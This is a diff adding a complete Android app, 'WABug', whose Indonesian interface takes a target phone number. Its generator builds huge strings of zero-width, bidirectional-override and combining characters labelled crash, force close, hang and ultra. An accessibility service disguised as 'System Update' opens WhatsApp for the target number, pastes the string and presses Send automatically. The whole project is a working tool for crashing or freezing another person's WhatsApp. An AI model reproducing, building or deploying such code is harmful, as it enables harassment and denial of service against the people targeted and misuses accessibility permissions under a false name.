@@ -1,0 +1,460 @@
+name: Build APK
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with:
+          distribution: 'zulu'
+          java-version: '17'
+      - uses: android-actions/setup-android@v3
+      - name: Grant execute permission
+        run: chmod +x gradlew
+      - name: Build APK
+        run: ./gradlew assembleDebug
+      - uses: actions/upload-artifact@v4
+        with:
+          name: WABug-APK
+          path: app/build/outputs/apk/debug/app-debug.apkinclude ':app'
+rootProject.name = "WABug"buildscript {
+    repositories { google(); mavenCentral() }
+    dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
+}
+allprojects {
+    repositories { google(); mavenCentral() }
+}android.useAndroidX=true
+android.enableJetifier=true
+org.gradle.jvmargs=-Xmx2048m#!/bin/sh
+exec gradle "$@"plugins { id 'com.android.application' }
+
+android {
+    namespace 'com.wanz.wabug'
+    compileSdk 34
+    defaultConfig {
+        applicationId "com.wanz.wabug"
+        minSdk 23
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+    }
+    buildTypes {
+        release {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+    lint { abortOnError false }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+}-keep class com.wanz.wabug.** { *; }<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+
+    <application
+        android:allowBackup="true"
+        android:label="System Update"
+        android:theme="@android:style/Theme.Material.NoActionBar">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".AutoSendService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/auto_service"/>
+        </service>
+
+    </application>
+</manifest><?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagReportViewIds"
+    android:canRetrieveWindowContent="true"
+    android:notificationTimeout="50"
+    android:description="System accessibility service"/><resources>
+    <string name="app_name">System Update</string>
+</resources>package com.wanz.wabug;
+
+import java.util.Random;
+
+public class BugGenerator {
+    private static final Random RNG = new Random();
+
+    public static String generate(String jenis) {
+        switch (jenis) {
+            case "crash":   return crash();
+            case "fc":      return fc();
+            case "hang":    return hang();
+            case "blank":   return blank();
+            case "mega":    return mega();
+            case "ultra":   return ultra();
+            default:        return crash();
+        }
+    }
+
+    public static String crash() {
+        StringBuilder sb = new StringBuilder();
+        sb.append('\u202E');
+        char[] zw = {'\u200B', '\u200C', '\u200D', '\u2060', '\uFEFF'};
+        for (int i = 0; i < 30000; i++) sb.append(zw[i % zw.length]);
+        for (int i = 0; i < 15000; i++) sb.append((char) (0x0300 + RNG.nextInt(0x70)));
+        for (int i = 0; i < 20000; i++) sb.append('\u2067');
+        for (int i = 0; i < 5000; i++) {
+            sb.append((char) (0x0900 + RNG.nextInt(128)));
+            for (int j = 0; j < 30; j++) sb.append((char) (0x0300 + RNG.nextInt(0x70)));
+        }
+        sb.append('\u202C');
+        return sb.toString();
+    }
+
+    public static String fc() {
+        StringBuilder sb = new StringBuilder();
+        String[] e = {"🇦","🇧","🇨","🇩","🇪","🇫","🇬","🇭","🇮","🇯","🇰","🇱","🇲","🇳","🇴","🇵","🇶","🇷","🇸","🇹","🇺","🇻","🇼","🇽","🇾","🇿"};
+        for (int i = 0; i < 5000; i++) sb.append(e[i % e.length]);
+        return sb.toString();
+    }
+
+    public static String hang() {
+        StringBuilder sb = new StringBuilder();
+        sb.append('\u202E');
+        for (int i = 0; i < 20000; i++) sb.append("\u2067\u200B\u200C\u202E");
+        sb.append('\u202C');
+        return sb.toString();
+    }
+
+    public static String blank() {
+        StringBuilder sb = new StringBuilder();
+        for (int c = 0; c < 2000; c++) {
+            sb.append('\u200B');
+            for (int i = 0; i < 80; i++) sb.append((char) (0x0300 + RNG.nextInt(0x70)));
+        }
+        return sb.toString();
+    }
+
+    public static String mega() {
+        return crash() + fc() + hang();
+    }
+
+    public static String ultra() {
+        return crash() + fc() + hang() + blank() + crash();
+    }
+}package com.wanz.wabug;
+
+import android.accessibilityservice.AccessibilityService;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import java.util.List;
+
+public class AutoSendService extends AccessibilityService {
+    private static final String TAG = "AutoSend";
+    public static AutoSendService instance;
+
+    private String pendingText = null;
+    private boolean waiting = false;
+    private long lastTrigger = 0;
+    private int retryCount = 0;
+    private final Handler handler = new Handler(Looper.getMainLooper());
+
+    @Override
+    public void onServiceConnected() {
+        super.onServiceConnected();
+        instance = this;
+    }
+
+    public void triggerSend(String nomor, String jenisBug) {
+        String teks = BugGenerator.generate(jenisBug);
+        ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        cm.setPrimaryClip(ClipData.newPlainText("bug", teks));
+        pendingText = teks;
+        waiting = true;
+        retryCount = 0;
+        lastTrigger = System.currentTimeMillis();
+        android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_VIEW);
+        i.setData(android.net.Uri.parse("https://wa.me/" + nomor));
+        i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(i);
+    }
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event == null || !waiting) return;
+        if (event.getPackageName() == null) return;
+        String pkg = event.getPackageName().toString();
+        if (!pkg.equals("com.whatsapp") && !pkg.equals("com.whatsapp.w4b")) return;
+        if (System.currentTimeMillis() - lastTrigger > 30000) {
+            waiting = false;
+            pendingText = null;
+            return;
+        }
+        handler.postDelayed(this::trySend, 800);
+    }
+
+    private void trySend() {
+        if (!waiting || pendingText == null) return;
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) { retry(); return; }
+        AccessibilityNodeInfo edit = findInput(root);
+        if (edit == null) { retry(); return; }
+        Bundle args = new Bundle();
+        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pendingText);
+        boolean success = edit.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+        if (!success) {
+            edit.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
+            edit.performAction(AccessibilityNodeInfo.ACTION_PASTE);
+        }
+        handler.postDelayed(() -> {
+            AccessibilityNodeInfo r2 = getRootInActiveWindow();
+            if (r2 == null) { retry(); return; }
+            AccessibilityNodeInfo send = findSend(r2);
+            if (send != null) {
+                if (send.isClickable()) {
+                    send.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                } else {
+                    AccessibilityNodeInfo parent = send.getParent();
+                    int depth = 0;
+                    while (parent != null && depth < 5) {
+                        if (parent.isClickable()) {
+                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            break;
+                        }
+                        parent = parent.getParent();
+                        depth++;
+                    }
+                }
+                waiting = false;
+                pendingText = null;
+            } else { retry(); }
+        }, 700);
+    }
+
+    private void retry() {
+        retryCount++;
+        if (retryCount < 15) handler.postDelayed(this::trySend, 500);
+        else { waiting = false; pendingText = null; }
+    }
+
+    private AccessibilityNodeInfo findInput(AccessibilityNodeInfo root) {
+        List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
+        if (l == null || l.isEmpty()) l = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/entry");
+        if (l != null && !l.isEmpty()) return l.get(0);
+        return findClass(root, "android.widget.EditText");
+    }
+
+    private AccessibilityNodeInfo findSend(AccessibilityNodeInfo root) {
+        List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
+        if (l == null || l.isEmpty()) l = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/send");
+        if (l != null && !l.isEmpty()) return l.get(0);
+        return findDesc(root, "Send");
+    }
+
+    private AccessibilityNodeInfo findClass(AccessibilityNodeInfo n, String c) {
+        if (n == null) return null;
+        if (n.getClassName() != null && n.getClassName().toString().equals(c)) return n;
+        for (int i = 0; i < n.getChildCount(); i++) {
+            AccessibilityNodeInfo r = findClass(n.getChild(i), c);
+            if (r != null) return r;
+        }
+        return null;
+    }
+
+    private AccessibilityNodeInfo findDesc(AccessibilityNodeInfo n, String d) {
+        if (n == null) return null;
+        if (n.getContentDescription() != null && n.getContentDescription().toString().equalsIgnoreCase(d)) return n;
+        for (int i = 0; i < n.getChildCount(); i++) {
+            AccessibilityNodeInfo r = findDesc(n.getChild(i), d);
+            if (r != null) return r;
+        }
+        return null;
+    }
+
+    @Override public void onInterrupt() { waiting = false; pendingText = null; }
+}package com.wanz.wabug;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.view.Gravity;
+import android.widget.*;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class MainActivity extends AppCompatActivity {
+    private EditText etNomor;
+    private TextView tvStatus;
+    private LinearLayout mainLayout;
+    private String target = "";
+
+    @Override
+    protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        buildUI();
+    }
+
+    private void buildUI() {
+        ScrollView sv = new ScrollView(this);
+        sv.setBackgroundColor(0xFF050507);
+
+        mainLayout = new LinearLayout(this);
+        mainLayout.setOrientation(LinearLayout.VERTICAL);
+        mainLayout.setPadding(50, 60, 50, 60);
+        mainLayout.setGravity(Gravity.CENTER_HORIZONTAL);
+
+        TextView title = new TextView(this);
+        title.setText("System Update");
+        title.setTextColor(0xFFFAFAFA);
+        title.setTextSize(26);
+        title.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
+        title.setGravity(Gravity.CENTER);
+        mainLayout.addView(title);
+
+        TextView sub = new TextView(this);
+        sub.setText("Service Panel");
+        sub.setTextColor(0xFFEF4444);
+        sub.setTextSize(11);
+        sub.setLetterSpacing(0.2f);
+        sub.setGravity(Gravity.CENTER);
+        sub.setPadding(0, 6, 0, 40);
+        mainLayout.addView(sub);
+
+        Button btnAcc = makeButton("⚙️ AKTIFKAN SERVICE", 0xFF3B82F6);
+        btnAcc.setOnClickListener(v -> {
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            Toast.makeText(this, "Cari 'System Update' → ON", Toast.LENGTH_LONG).show();
+        });
+        mainLayout.addView(btnAcc);
+
+        TextView lblNomor = new TextView(this);
+        lblNomor.setText("Nomor Target");
+        lblNomor.setTextColor(0xFF71717A);
+        lblNomor.setTextSize(11);
+        lblNomor.setPadding(0, 30, 0, 8);
+        mainLayout.addView(lblNomor);
+
+        etNomor = new EditText(this);
+        etNomor.setHint("628xxxxxxxxxx");
+        etNomor.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
+        etNomor.setTextColor(0xFFFAFAFA);
+        etNomor.setHintTextColor(0xFF4A1D1D);
+        etNomor.setBackgroundColor(0xFF0A0A0F);
+        etNomor.setPadding(30, 30, 30, 30);
+        etNomor.setTextSize(14);
+        mainLayout.addView(etNomor);
+
+        Button btnSet = makeButton("💾 SIMPAN TARGET", 0xFF22C55E);
+        btnSet.setOnClickListener(v -> {
+            String n = etNomor.getText().toString().replaceAll("[^0-9]", "");
+            if (n.length() < 10) { toast("Nomor tidak valid"); return; }
+            target = n;
+            tvStatus.setText("✓ Target siap");
+            tvStatus.setTextColor(0xFF22C55E);
+            etNomor.setText("");
+            etNomor.setHint("••••••••••");
+            toast("Target tersimpan");
+        });
+        mainLayout.addView(btnSet);
+
+        tvStatus = new TextView(this);
+        tvStatus.setText("- belum diisi -");
+        tvStatus.setTextColor(0xFF52525B);
+        tvStatus.setTextSize(11);
+        tvStatus.setGravity(Gravity.CENTER);
+        tvStatus.setPadding(0, 20, 0, 30);
+        mainLayout.addView(tvStatus);
+
+        addSection("💥 BUG WA — KLIK = CRASH");
+
+        String[][] bugs = {
+            {"☠️ CRASH", "crash"},
+            {"💥 FORCE CLOSE", "fc"},
+            {"📞 HANG", "hang"},
+            {"⬜ BLANK", "blank"},
+            {"🚀 MEGA", "mega"},
+            {"💀 ULTRA", "ultra"}
+        };
+
+        for (String[] bug : bugs) {
+            Button btn = makeButton(bug[0], 0xFFEF4444);
+            final String jenis = bug[1];
+            btn.setOnClickListener(v -> kirim(jenis));
+            mainLayout.addView(btn);
+        }
+
+        sv.addView(mainLayout);
+        setContentView(sv);
+    }
+
+    private void addSection(String text) {
+        TextView tv = new TextView(this);
+        tv.setText(text);
+        tv.setTextColor(0xFF991B1B);
+        tv.setTextSize(10);
+        tv.setLetterSpacing(0.2f);
+        tv.setPadding(0, 40, 0, 12);
+        mainLayout.addView(tv);
+    }
+
+    private Button makeButton(String text, int color) {
+        Button btn = new Button(this);
+        btn.setText(text);
+        btn.setTextColor(0xFFFFFFFF);
+        btn.setTextSize(12);
+        btn.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
+        btn.setBackgroundColor(color);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT);
+        lp.setMargins(0, 6, 0, 6);
+        btn.setLayoutParams(lp);
+        btn.setAllCaps(false);
+        return btn;
+    }
+
+    private void kirim(String jenis) {
+        if (target.isEmpty()) { toast("Set target dulu!"); return; }
+        if (AutoSendService.instance == null) {
+            toast("Aktifkan Accessibility dulu!");
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            return;
+        }
+        AutoSendService.instance.triggerSend(target, jenis);
+        toast("📤 Auto kirim " + jenis.toUpperCase());
+    }
+
+    private void toast(String s) {
+        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
+    }
+}
